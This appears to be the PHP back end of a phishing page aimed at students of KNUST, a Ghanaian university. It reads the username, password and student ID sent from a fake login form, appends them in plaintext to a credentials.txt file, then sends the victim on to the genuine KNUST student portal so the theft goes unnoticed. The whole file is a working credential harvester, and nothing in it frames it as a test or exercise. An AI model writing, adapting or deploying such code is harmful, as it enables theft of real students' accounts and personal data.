<?php
// Get the submitted data
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$studentId = isset($_POST['studentId']) ? $_POST['studentId'] : '';

// Format the data
$data = "Username: " . $username . " | Password: " . $password . " | ID: " . $studentId . "\n";

// Get the directory where this script is located
$dir = __DIR__;
$file_path = $dir . "/credentials.txt";

// Save to file using file_put_contents (simpler and more reliable)
$result = file_put_contents($file_path, $data, FILE_APPEND | LOCK_EX);

if ($result === false) {
    // If saving failed, show error
    echo "Error: Could not save credentials. Check file permissions.";
} else {
    // Redirect to KNUST portal
    header("Location: https://apps.knust.edu.gh/students");
    exit();
}
?>